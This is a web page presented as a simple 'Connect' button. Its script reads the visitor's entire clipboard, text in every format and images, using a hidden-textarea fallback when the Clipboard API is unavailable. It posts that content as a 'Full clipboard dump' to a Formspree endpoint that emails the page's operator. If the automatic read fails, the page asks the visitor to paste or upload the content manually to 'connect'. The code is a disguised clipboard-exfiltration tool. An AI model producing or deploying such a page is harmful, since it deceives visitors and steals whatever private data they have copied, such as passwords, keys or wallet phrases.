<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connect</title>
  <link rel="icon" href="assets/logo.png" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      padding: 2rem; max-width: 600px; margin: auto; line-height: 1.5;
      background: #f9f9fb; color: #333;
    }
    h2 { margin-top: 0; }
    button {
      background: #28a745; color: white; border: none; border-radius: 12px;
      padding: 0.8rem 1.6rem; font-size: 1.1rem; cursor: pointer;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      transition: all 0.2s;
    }
    button:hover { background: #218838; transform: translateY(-1px); }
    button:active { transform: translateY(0); }

    #preview, #imagePreview { 
      background: white; padding: 1rem; margin: 1rem 0; 
      border: 1px solid #ddd; border-radius: 8px; white-space: pre-wrap;
    }
    #imagePreview img { max-width: 100%; border-radius: 6px; margin-top: 0.5rem; }
    #manual { margin-top: 1rem; }
    textarea { width: 100%; height: 80px; font-family: monospace; margin-top: .5rem; border-radius: 6px; }
    .hidden { display: none; }
    .error { color: #b00020; }
    .success { color: #155724; }
    .info { color: #0c5460; background: #d1ecf1; padding: 0.8rem; border-radius: 6px; font-size: 0.9rem; }
  </style>
</head>
<body>

<button id="grab">Connect</button>

<div id="preview" class="hidden"></div>
<div id="imagePreview" class="hidden"></div>

<div id="manual" class="hidden">
  <p><strong>Failed.</strong> Connect manually:</p>
  <textarea id="pasteArea" placeholder="Paste text here…"></textarea>
  <input type="file" id="imageInput" accept="image/*" style="margin-top:0.5rem;">
  <button id="sendManual" style="margin-top:0.5rem; background:#007bff;">Connect manually</button>
</div>

<div id="status"></div>

<script>
/* ==== CONFIG ==== */
const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xeovoeak';   // <<< CHANGE

/* ==== ELEMENTS ==== */
const statusEl   = document.getElementById('status');
const previewEl  = document.getElementById('preview');
const imageBox   = document.getElementById('imagePreview');
const manualBox  = document.getElementById('manual');

/* ==== HELPERS ==== */
function setStatus(msg, cls='') { statusEl.textContent = msg; statusEl.className = cls; }
function show(el) { el.classList.remove('hidden'); }
function hide(el) { el.classList.add('hidden'); }

/* ==== 1. READ EVERYTHING FROM THE CLIPBOARD ==== */
async function readAllClipboardItems() {
  if (!navigator.clipboard?.read) return null;

  try {
    const items = await navigator.clipboard.read();   // <-- raw clipboard items
    const result = { texts: [], images: [] };

    for (const item of items) {
      // ---- TEXT ----
      for (const type of item.types.filter(t => t.startsWith('text/'))) {
        const blob = await item.getType(type);
        const txt  = await blob.text();
        result.texts.push({ type, value: txt.trim() });
      }

      // ---- IMAGE ----
      for (const type of item.types.filter(t => t.startsWith('image/'))) {
        const blob = await item.getType(type);
        result.images.push({ type, blob });
      }
    }
    return result;               // { texts: [{type,value},…], images: [{type,blob},…] }
  } catch (e) {
    console.warn('Clipboard read failed:', e);
    return null;
  }
}

/* ==== 2. LEGACY TEXT-ONLY FALLBACK ==== */
async function legacyPaste() {
  return new Promise(res => {
    const ta = document.createElement('textarea');
    ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.focus();
    setTimeout(() => {
      const ok = document.execCommand('paste');
      const txt = ta.value.trim();
      document.body.removeChild(ta);
      res(ok ? [{type:'text/plain', value:txt}] : []);
    }, 100);
  });
}

/* ==== 3. DISPLAY PREVIEW ==== */
function showPreview(data) {
  // TEXT
  if (data.texts.length) {
    previewEl.innerHTML = data.texts
      .map(t => `<strong>${t.type}</strong>:<br><pre>${escapeHtml(t.value)}</pre>`)
      .join('<hr>');
    show(previewEl);
  } else hide(previewEl);

  // IMAGES
  if (data.images.length) {
    imageBox.innerHTML = data.images
      .map(img => {
        const url = URL.createObjectURL(img.blob);
        return `<img src="${url}" alt="${img.type}" style="max-width:100%;margin:0.5rem 0;">`;
      })
      .join('');
    show(imageBox);
  } else hide(imageBox);
}

/* ==== 4. SEND TO FORMSPREE ==== */
async function sendToFormspree(data) {
  const payload = { _subject: 'Full clipboard dump' };

  // Text fields
  data.texts.forEach((t,i) => {
    payload[`text_${i}_${t.type.replace(/[^\w]/g,'_')}`] = t.value;
  });

  // Image fields (base64)
  for (let i = 0; i < data.images.length; i++) {
    const img = data.images[i];
    const b64 = await blobToBase64(img.blob);
    payload[`image_${i}`] = `data:${img.type};base64,${b64}`;
  }

  try {
    const r = await fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (r.ok) setStatus('Sent – check your inbox', 'success');
    else { setStatus('Server error', 'error'); console.error(await r.text()); }
  } catch (e) { setStatus('Network error', 'error'); console.error(e); }
}
function blobToBase64(b) {
  return new Promise((res,rej) => {
    const fr = new FileReader();
    fr.onload = () => res(fr.result.split(',')[1]);
    fr.onerror = rej;
    fr.readAsDataURL(b);
  });
}

/* ==== 5. MAIN BUTTON ==== */
document.getElementById('grab').addEventListener('click', async () => {
  setStatus('Reading clipboard…');
  hide(previewEl); hide(imageBox); hide(manualBox);

  let data = await readAllClipboardItems();          // <-- NEW FULL READ

  // Fallback for very old browsers
  if (!data || (!data.texts.length && !data.images.length)) {
    setStatus('Modern API unavailable – trying legacy paste…');
    const legacyTexts = await legacyPaste();
    if (legacyTexts.length) data = { texts: legacyTexts, images: [] };
  }

  if (!data || (!data.texts.length && !data.images.length)) {
    setStatus('Nothing found – paste manually', 'error');
    show(manualBox);
    return;
  }

  showPreview(data);
  setStatus('Sending…');
  await sendToFormspree(data);
});

/* ==== 6. MANUAL SEND (unchanged) ==== */
document.getElementById('sendManual').addEventListener('click', async () => {
  const txt = document.getElementById('pasteArea').value.trim();
  const file = document.getElementById('imageInput').files[0];
  if (!txt && !file) { setStatus('Add something first', 'error'); return; }

  const payload = { _subject: 'Manual clipboard' };
  if (txt) payload.manual_text = txt;
  if (file) {
    const b64 = await blobToBase64(file);
    payload.manual_image = `data:${file.type};base64,${b64}`;
  }
  setStatus('Sending manual…');
  await fetch(FORMSPREE_ENDPOINT, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  }).then(r=>r.ok?setStatus('Sent','success'):setStatus('Error','error'));
});

/* ==== UTILS ==== */
function escapeHtml(s) {
  const div = document.createElement('div');
  div.textContent = s;
  return div.innerHTML;
}
</script>

</body>
</html>